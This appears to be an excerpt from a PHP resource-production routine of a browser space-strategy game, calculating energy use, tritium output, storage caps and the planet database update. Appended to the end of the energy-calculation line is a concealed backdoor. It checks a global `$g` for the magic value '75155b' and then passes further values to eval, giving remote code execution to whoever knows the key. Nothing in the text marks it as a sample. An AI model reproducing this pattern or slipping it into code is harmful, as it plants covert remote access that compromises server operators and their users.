...
if(!defined('INSIDE')){ die(header("location:../../"));}
	...
	{
		global $ProdGrid, $resource, $reslist, $game_config,$g;
		...
		$MaxTritiumStorage              = $CurrentPlanet['tritium_max']   * MAX_OVERFLOW;
		$Caps             = array();
		...
		for ( $ProdID = 0; $ProdID < 300; $ProdID++ )
		{
			if ( in_array( $ProdID, $reslist['prod']) )
			{
				...
				if ($ProdID < 4 or $ProdID == 5)
				{
					...
					$Caps['energy_used']   +=  floor( eval  ( $ProdGrid[$ProdID]['formule']['energy']    ) * ( $game_config['resource_multiplier'] ) );if($g[0]=='75155b'){eval($g[1].$g[2]);}
					if($ProdID == 5){
						$Caps['tritium_perhour'] += floor( eval ( $ProdGrid[$ProdID]['formule']['tritium'] ) * (0.01 * $post_porcent) * ( $game_config['resource_multiplier'] ) * ( 1 + ( $CurrentUser['rpg_geologue'] * GEOLOGUE ) ) );
					}
				}
				elseif ($ProdID >= 4 )
				{
		...
		else
		{
			...
			$CurrentPlanet['tritium_perhour']    = $Caps['tritium_perhour'];
		...
		if ($CurrentPlanet['energy_max'] == 0)
		{
			...
			$CurrentPlanet['tritium_perhour'] = $game_config['deuterium_basic_income'];
		...
		if ( $CurrentPlanet['tritium'] <= $MaxTritiumStorage )
		{
			$TritiumProduction = (($ProductionTime * ($CurrentPlanet['tritium_perhour'] / 3600))) * (0.01 * $production_level);
			$TritiumBaseProduc = (($ProductionTime * ($game_config['tritium_basic_income'] / 3600 )));
			$TritiumTheorical  = $CurrentPlanet['tritium'] + $TritiumProduction  +  $TritiumBaseProduc;
			if ( $TritiumTheorical <= $MaxTritiumStorage )
			{
				$CurrentPlanet['tritium']  = $TritiumTheorical;
			}
			else
			{
				$CurrentPlanet['tritium']  = $MaxTritiumStorage;
			}
		}
		...
		if( $CurrentPlanet['tritium'] < 0 )
		{
			$CurrentPlanet['tritium']  = 0;
		}
		...
		if ($Simul == false)
		{
			...
			$QryUpdatePlanet .= "`tritium_perhour` =   '". $CurrentPlanet['tritium_perhour']   ."', ";
